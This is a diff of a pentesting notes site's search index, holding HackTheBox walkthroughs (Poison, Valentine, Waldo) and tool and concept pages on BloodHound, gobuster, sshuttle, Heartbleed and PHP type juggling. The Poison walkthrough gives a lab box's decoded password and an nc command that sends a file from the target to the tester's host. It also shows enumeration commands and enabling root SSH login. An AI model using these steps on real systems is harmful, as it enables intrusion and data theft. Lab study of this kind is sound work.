@@ -4,14 +4,21 @@
 	"title": "Boxes",
 	"tags": [],
 	"description": "",
-	"content": "Boxes\n"
+	"content": "Boxes\n```  Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\n  Valentine I lost my original notes. VM corrupted. PHASE 1 — NMAP nmap -sC -sV -Pn -oA initial 10.10.10.79 Didn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out. PHASE 2 — GOBUSTER /wpscan gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50 return vulnerable to OpenSSL hearbleed PHASE 3 Manual investigation of the webpage\n  Waldo WALDO Instead of giving binaries system-wide permissions, give them the permissions they need to do the job. Skipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work. Sqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output.\n  ```\n"
 },
 {
-	"uri": "/hackthebox/challenges/challenges/",
+	"uri": "/hackthebox/challenges/bloodhound/",
 	"title": "",
 	"tags": [],
 	"description": "",
 	"content": ""
+},
+{
+	"uri": "/tools/bloodhound/",
+	"title": "BloodHound Neo4j",
+	"tags": [],
+	"description": "setting up bloodhound in a Debian environment",
+	"content": "TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.\nI would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.\n##### echo \u0026quot;deb http://httpredir.debian.org/debian jessie-backports main\u0026quot; | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list apt-get update ##### apt-get -t jessie-backports install ca-certificates-java ##### take the output and put it after set \u0026lt;java8bane\u0026gt; update-java-alternatives --list ##### currently update-java-alternatives --jre --set \u0026lt;java8name\u0026gt; ##### update repo wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add - echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee -a /etc/apt/sources.list.d/neo4j.list sudo apt-get update ###### neo4j start -- background neo4j console -- foreground  BloodHound\ngo to the desirded location you wish to set this up. For me a have a tool directory. ##### this is already compiled ready to go git clone https://github.com/BloodHoundAD/BloodHound.git cd BloodHound wget https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-linux-x64.zip unzip BloodHound-linux-x64.zip ./Bloodhound if you get a white screen hit these keys ( crtl + r ) #### For a lager selection of compiled bloodhound releases. https://github.com/BloodHoundAD/BloodHound/releases  I changed the password before I got to this part. So I will be using screenshots from ippsecs video. when you first setup bloodhound and enter some creds it\u0026rsquo;ll ask you to go to localhost:7687 to change the password. go to your browser and type it in. the default creds for neo4j are neo4j and it won\u0026rsquo;t let you in until you change the password which is nice a feature.\nbloodhound login\ninitial neo4j browser page\nchange your password\nIf you\u0026rsquo;d like to install from the repo use this guide\nhttps://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ references and thanks https://www.youtube.com/watch?v=ob9SgtFm6_g\u0026amp;t=21s https://neo4j.com/docs/operations-manual/current/installation/linux/debian/ https://0xdf.gitlab.io/2018/11/10/htb-reel.html  "
 },
 {
 	"uri": "/categories/",
@@ -19,13 +26,6 @@
 	"tags": [],
 	"description": "",
 	"content": ""
-},
-{
-	"uri": "/hackthebox/challenges/",
-	"title": "Challenges",
-	"tags": [],
-	"description": "",
-	"content": "Challenges\n"
 },
 {
 	"uri": "/_header/",
@@ -49,11 +49,25 @@
 	"content": ""
 },
 {
+	"uri": "/tools/ftp/",
+	"title": "FTP",
+	"tags": [],
+	"description": "",
+	"content": "File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I\u0026rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.\nmget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS \u0026amp; SFTP\nSSHFS is built on SFTP. SFTP use’s the SSH protocol for added security to FTP. SSHFS allows you to mount to the file system. This gives you more options when interacting with the host. If SSH is available on the host you can use SFTP or SSHFS.\napt-get install sshfs -y sshfs -p 2222 user@ip_address: /mnt/nightmare/ find . -ls 2\u0026gt;/dev/null \u0026gt; ~/out/put/directory.txt \u0026lt;-- takes forever grep file.txt ~/out/put/directory.txt  "
+},
+{
+	"uri": "/tools/webapp/gobuster/",
+	"title": "GoBuster",
+	"tags": [],
+	"description": "",
+	"content": " Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb \u0026amp; dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.\nEnumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100\n-t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on.\n-s \u0026ldquo;200,204,301,302,307,404\u0026rdquo; errors to look for you can edit these\n-w medium or small\n-x extensions Linux php html txt doc Windows aspx asp php\n-fw force wild card\nAdding SessionID this can be easily overlooked.\n-c PHPSESSIONID=1324567890\nEnumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE).\ngobuster -u http://localhost:3000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 39\ngobuster -u http://target:port -a \u0026lsquo;agent\u0026rsquo; -w wordlists -t 100\nAdding multple extentions\n-x php,aspx,asp,html,doc,txt\n"
+},
+{
 	"uri": "/hackthebox/",
 	"title": "HackTheBox",
 	"tags": [],
 	"description": "",
-	"content": "HackTheBox\n"
+	"content": "HackTheBox\n Boxes Boxes ``` Poison PHASE 1 NMAP nmap -sC -sV -Pn -oA initial_poison 10.10.10.84 port 22 ssh it can be a rabbit-hole. port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32 port 514 hmm PHASE 2 LFI Manually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.\n  Miscellaneous Setting up Test Enviroment or Complicated tools.   "
 },
 {
 	"uri": "/concepts/webapppentest/heartbld/",
@@ -61,6 +75,13 @@
 	"tags": [],
 	"description": "",
 	"content": "Heart bleed is an OpenSSL vulnerability that allows the attacker to �bleed� out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time. Messing around with the POC was tricky the c code has all these errors and won�t compile arg, luckily for me, Metasploit has the solution.\nProff of concept https://www.exploit-db.com/exploits/32745/\nMetasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed\n"
+},
+{
+	"uri": "/hackthebox/challenges/",
+	"title": "Miscellaneous",
+	"tags": [],
+	"description": "",
+	"content": "Setting up Test Enviroment or Complicated tools.\n  \n  "
 },
 {
 	"uri": "/concepts/webapppentest/osinjcmd/",
@@ -75,6 +96,27 @@
 	"tags": [],
 	"description": "",
 	"content": "PHP Type Juggling\nThis article will cover PHP type juggling, and some different ways i have encountered it on hackthebox .\nPHP has two comparisons; loose (==, =!) and strict (===). Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used. This is a built in feature for PHP to force type conversion into specific data type.\nPHP loose comparison does this to accommodate different data types for example; ‘9’ is different from 9. Adding the two data types in PHP will result in 18. In other languages like python will not accommodate such errors. PHP does this so the program might run as it was expected to. Accommodating human errors. Below are some examples of loose comparison.\n'0e1234' == '0e4321' '0e1234' == '0' '0e1234' \u0026lt;= '1' '0xf' == '15' #0xf in hexadecimal notation is 15  when php compares a string to a interger it has some weird quirks.\n'000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)  Another example is when PHP try’s to interpreter a string and its converted into PHP exponential notation 0e⁰²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ 0e²³⁴²⁶²³⁴²²⁴¹²⁵¹⁶⁷⁸⁹ equates to int(0) as well. If the number after the first letter is 0 it will remove the leading zero.\nIn the above examples the entire string is converted into a numerical value, or something completely different. Confusing I know but here are some popular charts that show how loose comparison works.\nThe Encounters\nphpsession, cookies, \u0026amp; passwords are susceptible to PHP type juggling. Allowing the attacker to take advantage of a PHP feature to gain access to valid user accounts. From what I have read, the attacker randomly generates cookies. Trying to predict the next cookie. The more random(entropy) the targets cookies have, the harder it is to preform this attack.\nIn the below example, PHP will convert both of the md5 hashes into integers. It will then compare the two values based on the integer. Even though the two hash are different they are both treated as value.\nsubmited cookie aa6fw…34tj4343 = 0 stored cookie ff6dj..w221.5885m = 0  This is also applicable to PHP authentication\nstored password e0rj238r submited password e0mfwewl  References:\nhttps://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ https://www.whitehatsec.com/blog/magic-hashes/  "
+},
+{
+	"uri": "/hackthebox/boxes/poison/",
+	"title": "Poison",
+	"tags": [],
+	"description": "",
+	"content": "PHASE 1 NMAP\nnmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.\nport 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32\nport 514 hmm\nPHASE 2 LFI\nManually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\nnext step you will have to decode this secure password.txt. I’d like to note that md5(TMOBILE …COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool — https://gchq.github.io/CyberChef/\nCharix!2#4%6\u0026amp;8(0\nPHASE 3 SSH :🤣\nThis time it wasn’t a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It’s not poison, after a while, I got it right charix is the username.\nsecret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn’t available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS\npython3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.\nFile transfer for NetCat this tool will transfer a file to the other session the \u0026gt; overwrites the file your nc -l -p 8081 \u0026gt; directory_path fromt target nc 10.10.14.3 8081 \u0026gt; secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!\nnetstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN\nYeah, didn’t know this before this box but you can ssh into localhost.\nSSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that’s what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!\n-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you’re smashed into, send it from that host to IP:PORT2\nconcept\nthe juice. it’s a secret guess\nPHASE 5 FINALE\nport 5801 is associated with Vncviewer.\n"
+},
+{
+	"uri": "/tools/ssh/sshtunnling/",
+	"title": "SSHuttle",
+	"tags": [],
+	"description": "",
+	"content": " Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target\u0026rsquo;s network. It has a lot of options/switches to use but by default, they are set to auto/detect. So typically you won\u0026rsquo;t need most of them.\nSomething to note you will need root access to run sshuttle; be sure to test the connection before wildly connecting.\nConnecting to a router with enabled ssh will give you access to the whole network. That is typical of VPN anyways.\nsshuttle -r chicken@192.168.1.6 172.16.42.1\n-r \u0026ndash;remote\n"
+},
+{
+	"uri": "/tools/webapp/sqlmap/sqlmap/",
+	"title": "SqlMap",
+	"tags": [],
+	"description": "",
+	"content": ""
 },
 {
 	"uri": "/tags/",
@@ -98,6 +140,13 @@
 	"content": "I lost my original notes. VM corrupted.\nPHASE 1 — NMAP\nnmap -sC -sV -Pn -oA initial 10.10.10.79\nDidn’t return anything of significance. https is odd for a hackthebox challenge. Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out.\nPHASE 2 — GOBUSTER /wpscan\ngobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50\nreturn vulnerable to OpenSSL hearbleed\nPHASE 3 Manual investigation of the webpage\nThe big give away. A heart bleeding, hmm.\nBELIEVE THE HYPE. It’s also a hint to the exploit.\nPHASE 4\nWpscan returned Heartbleed vulnerability.\nYou may also run the exploit through Metasploit.\nBuahahahahaha, we have the ssh RSA key. Truly we are master of the universe.\nwithout Metasploit\nSome crap, the server leaked.\nPHASE 6 SSH\nI wasn’t sure what the username was it took a few tries to figure out its hype :P.\n"
 },
 {
+	"uri": "/tools/webapp/wfuzz/",
+	"title": "WFUZZ",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
 	"uri": "/hackthebox/boxes/waldo/",
 	"title": "Waldo",
 	"tags": [],
@@ -110,4 +159,18 @@
 	"tags": [],
 	"description": "",
 	"content": ""
+},
+{
+	"uri": "/tools/webapp/",
+	"title": "WebApps",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "/tools/ssh/",
+	"title": "ssh",
+	"tags": [],
+	"description": "",
+	"content": "SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE\u0026rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.\nSSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.\nStart Service\nvi /etc/ssh/sshd_conf PermitRootLogin yes service ssh start\u0026lt;/c\n"
 }]
